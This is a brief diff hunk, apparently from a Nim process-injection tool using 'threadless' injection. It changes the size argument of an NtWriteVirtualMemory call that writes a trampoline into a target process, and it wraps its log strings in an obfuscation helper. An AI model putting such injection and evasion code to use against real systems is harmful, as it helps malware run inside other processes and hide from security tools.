@@ -163,7 +163,7 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
                 echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
             return false
     
-    status = NtWriteVirtualMemory(processHandle, trampolineAddress, unsafeAddr trampolineStk[0], trampolineSize, &szOutput)
+    status = NtWriteVirtualMemory(processHandle, trampolineAddress, unsafeAddr trampolineStk[0], trampSize, &szOutput)
     if (status == 0):
         when defined(verbose):
             echo obf("[+] Write memory success "), repr(trampolineAddress)
